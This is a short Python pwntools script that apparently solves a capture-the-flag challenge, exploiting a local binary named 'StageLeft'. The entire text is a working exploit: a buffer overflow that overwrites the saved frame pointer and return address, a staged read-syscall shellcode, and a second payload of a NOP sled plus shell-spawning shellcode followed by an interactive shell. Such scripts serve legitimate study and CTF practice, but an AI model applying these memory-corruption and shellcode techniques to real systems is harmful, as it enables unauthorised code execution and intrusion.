from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
r = process("./StageLeft")
elf = ELF("./StageLeft")

payload = asm('''
mov rsi, r12
sub rsi, 0x118
xor edi, edi
syscall
''')
payload = b'A' * 0x20 + p64(elf.bss()+0x800) +p64(0x401238) + payload

pause()
print(f"{payload}")
r.sendline(payload)
pause()
r.sendline(b'\x90'*0x40 + asm('sub rsp,0x100') + asm(shellcraft.sh()))
r.interactive()